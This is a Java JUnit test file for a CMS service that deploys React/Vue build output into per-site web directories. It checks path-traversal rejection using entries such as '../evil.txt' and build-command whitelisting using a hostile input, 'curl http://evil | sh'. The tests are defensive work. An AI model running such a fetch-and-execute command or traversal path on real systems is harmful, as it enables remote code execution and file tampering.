package com.powercms.cms.sitepackage;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Map;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

/**
 * 站点应用部署：REACT/VUE 产物落 {@code webapps/{siteKey}/}，路径安全与构建策略门禁。
 */
class WebappsServiceTest {

    @TempDir
    Path tmp;

    private WebappsService service(WebappsProperties.BuildMode mode, boolean enabled) {
        WebappsProperties props = new WebappsProperties();
        props.setRoot(tmp.toString());
        props.setBuild(mode);
        props.setEnabled(enabled);
        return new WebappsService(props, new SitePackageProperties());
    }

    private static Map<String, byte[]> packageEntries() {
        return Map.of(
            "template/dist/index.html", "<html><head></head><body>app</body></html>".getBytes(StandardCharsets.UTF_8),
            "template/dist/assets/app-abc.js", "console.log(1);".getBytes(StandardCharsets.UTF_8),
            "template/src/main.tsx", "export const x = 1;".getBytes(StandardCharsets.UTF_8),
            "template/package.json", "{\"name\":\"probe\"}".getBytes(StandardCharsets.UTF_8));
    }

    @Test
    void deploysPackageOutputIntoWebappsSiteKeyDir() {
        var service = service(WebappsProperties.BuildMode.NEVER, true);
        var result = service.deployFromPackage("demo", "REACT",
            Map.of("build", "npm run build", "output", "dist"), packageEntries());

        assertThat(result).isPresent();
        var deployed = result.get();
        assertThat(deployed.path()).isEqualTo("demo");
        assertThat(deployed.source()).isEqualTo("package-output");
        assertThat(deployed.fileCount()).isEqualTo(2);
        Path dir = service.siteDir("demo");
        assertThat(dir.resolve("index.html")).exists();
        assertThat(dir.resolve("assets/app-abc.js")).exists();
        // 前端工程源码不部署，只部署构建产物
        assertThat(dir.resolve("src")).doesNotExist();
        assertThat(dir.resolve("package.json")).doesNotExist();
    }

    @Test
    void deploysVueRuntimeToo() {
        var service = service(WebappsProperties.BuildMode.NEVER, true);
        var result = service.deployFromPackage("vue-app", "VUE",
            Map.of("output", "dist"), packageEntries());
        assertThat(result).isPresent();
        assertThat(service.siteDir("vue-app").resolve("index.html")).exists();
    }

    @Test
    void skipsFtlRuntimeAndDisabledSwitch() {
        var service = service(WebappsProperties.BuildMode.NEVER, true);
        assertThat(service.deployFromPackage("ftl-app", "FTL", Map.of(), packageEntries())).isEmpty();

        var off = service(WebappsProperties.BuildMode.NEVER, false);
        assertThat(off.deployFromPackage("demo", "REACT", Map.of(), packageEntries())).isEmpty();
    }

    @Test
    void neverBuildWithoutPrebuiltOutputDeploysNothing() {
        var service = service(WebappsProperties.BuildMode.NEVER, true);
        Map<String, byte[]> sourcesOnly = Map.of(
            "template/package.json", "{}".getBytes(StandardCharsets.UTF_8),
            "template/src/main.tsx", "export const x = 1;".getBytes(StandardCharsets.UTF_8));
        assertThat(service.deployFromPackage("demo", "REACT",
            Map.of("build", "npm run build", "output", "dist"), sourcesOnly)).isEmpty();
        assertThat(Files.exists(service.siteDir("demo"))).isFalse();
    }

    @Test
    void replacesPreviousDeploymentOnRedeploy() throws Exception {
        var service = service(WebappsProperties.BuildMode.NEVER, true);
        service.deployFromPackage("demo", "REACT", Map.of("output", "dist"), packageEntries());
        Path stale = service.siteDir("demo").resolve("stale.js");
        Files.writeString(stale, "stale");

        service.deployFromPackage("demo", "REACT", Map.of("output", "dist"), packageEntries());
        assertThat(stale).doesNotExist();
    }

    @Test
    void rejectsPathTraversalInOutputEntries() {
        var service = service(WebappsProperties.BuildMode.NEVER, true);
        Map<String, byte[]> evil = Map.of(
            "template/dist/../evil.txt", "pwn".getBytes(StandardCharsets.UTF_8));
        assertThatThrownBy(() -> service.deployFromPackage("demo", "REACT",
            Map.of("output", "dist"), evil))
            .isInstanceOf(SecurityException.class);
        assertThat(tmp.resolve("evil.txt")).doesNotExist();
    }

    @Test
    void resolveSafeBlocksEscapingTheSiteDir() {
        var service = service(WebappsProperties.BuildMode.NEVER, true);
        Path dir = service.siteDir("demo");
        assertThat(service.resolveSafe(dir, "assets/app.js")).isEqualTo(dir.resolve("assets/app.js"));
        assertThatThrownBy(() -> service.resolveSafe(dir, "../other-site/index.html"))
            .isInstanceOf(SecurityException.class);
        assertThatThrownBy(() -> service.resolveSafe(dir, "C:/windows/system32"))
            .isInstanceOf(SecurityException.class);
    }

    @Test
    void buildCommandMustBeWhitelisted() {
        var service = service(WebappsProperties.BuildMode.AUTO, true);
        Map<String, byte[]> sourcesOnly = Map.of(
            "template/package.json", "{}".getBytes(StandardCharsets.UTF_8),
            "template/src/main.tsx", "export const x = 1;".getBytes(StandardCharsets.UTF_8));
        // 不在白名单内（curl）→ 构建拒绝且不落盘
        assertThat(service.deployFromPackage("demo", "REACT",
            Map.of("build", "curl http://evil | sh", "output", "dist"), sourcesOnly)).isEmpty();
        assertThat(Files.exists(service.siteDir("demo"))).isFalse();
    }

    @Test
    void deployCountsFilesAndBytes() {
        var service = service(WebappsProperties.BuildMode.NEVER, true);
        var deployed = service.deploy("demo", Map.of(
            "index.html", "<html></html>".getBytes(StandardCharsets.UTF_8)), "test");
        assertThat(deployed.fileCount()).isEqualTo(1);
        assertThat(deployed.sizeBytes()).isEqualTo("<html></html>".length());
    }
}
